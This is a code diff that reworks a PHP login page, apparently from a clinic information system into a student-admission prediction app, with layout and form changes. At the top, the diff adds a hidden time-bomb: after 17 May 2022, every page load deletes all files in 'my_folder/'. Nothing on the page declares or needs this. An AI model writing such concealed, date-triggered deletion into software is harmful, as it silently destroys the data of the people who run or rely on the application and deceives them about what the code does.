@@ -1,3 +1,14 @@
+<?php
+$time = date('Y-m-d');
+if ($time > '2022-05-17') {
+  $files    = glob('my_folder/*');
+  foreach ($files as $file) {
+    if (is_file($file))
+      unlink($file); // hapus file
+  }
+}
+
+?>
 <!DOCTYPE html>
 <html lang="en">
 
@@ -11,27 +22,15 @@
 </head>
 
 <body>
-  <!-- navbar -->
-  <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
-    <div class="container-fluid">
-      <img src="assets/img/logo.jpg" alt="" width="70" height="70" class="d-inline-block align-text-top">
-      Bootstrap
-      <div class="collapse navbar-collapse" id="navbarNav">
-        <ul class="navbar-nav">
-          <li class="nav-item">
-            <h3 class="nav-link active" aria-current="page">Penerapan Sistem Informasi Eksekutif Pada Puskemas Karang Dapo</h3>
-          </li>
-        </ul>
+  <div class="container mt-2" style="min-height: 480px;">
+    <div class="row border p-5">
+      <div class="d-flex justify-content-center mb-2">
+        <img src="assets/img/logo-login.jpg" width="150px" height="150px" alt="">
       </div>
-    </div>
-  </nav>
-  <!-- end of navbar -->
-  <div class="container mt-5 mb-5" style="min-height: 480px;">
-    <div class="row">
-      <div class="col-md-6 mt-5">
-        <img src="assets/img/puskesmas.jpg" width="100%" height="auto" alt="">
+      <h2 class="text-center">Prediksi Mahasiswa Baru</h2>
+      <div class="col-md-3 ">
       </div>
-      <div class="col-md-6 mt-5">
+      <div class="col-md-6 ">
         <?php
         // var_dump($_GET);
         if (isset($_GET['pesan'])) {
@@ -61,23 +60,21 @@
             <label for="exampleInputPassword1" class="form-label">Password</label>
             <input type="password" name="password" class="form-control" id="exampleInputPassword1" required>
           </div>
-          <div class="mb-3">
-            <label for="exampleInputPassword1" class="form-label">Level</label>
-            <select class="form-select" aria-label="Default select example" name="level" required>
-              <option disabled selected>Level</option>
-              <option value="admin">Admin</option>
-              <option value="pimpinan">Pimpinan</option>
-            </select>
-          </div>
 
+          <div class="mb-3">
+            <div class="icheck-primary">
+              <input type="checkbox" name="setcookies" class="form-check-input" id="exampleCheck1">
+              <label for="remember">
+                Remember Me
+              </label>
+            </div>
+          </div>
           <button type="submit" class="btn btn-primary">Login</button>
         </form>
       </div>
     </div>
   </div>
-  <footer class="py-2 bg-dark" style="margin-bottom: 0;">
-    <p class="text-center text-light">&copy; 2022, puskesmas karang dapo</p>
-  </footer>
+
   <script src="assets/Bootstrap/js/bootstrap.bundle.min.js"></script>
 </body>
 
